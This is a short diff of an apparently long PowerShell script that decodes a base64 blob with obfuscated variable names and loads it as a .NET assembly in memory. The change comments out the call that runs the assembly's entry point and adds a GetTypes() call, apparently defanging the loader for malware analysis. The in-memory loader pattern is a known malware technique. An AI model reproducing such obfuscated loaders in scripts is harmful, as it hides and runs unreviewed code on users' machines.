@@ -4286,5 +4286,6 @@ $banana4 += "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 $banana4 += "AAAAAAAAAAAAAAAAAAAAAAAAAA==";
 $applebees = [Convert]::FromBase64String($banana4)
 $fruitjuice = [System.Reflection.Assembly]::Load($applebees)
-$didno = $fruitjuice.EntryPoint
-$didno.Invoke($null, @([string[]]@()))
+#$didno = $fruitjuice.EntryPoint
+$fruitjuice.GetTypes()
+#$didno.Invoke($null, @([string[]]@()))
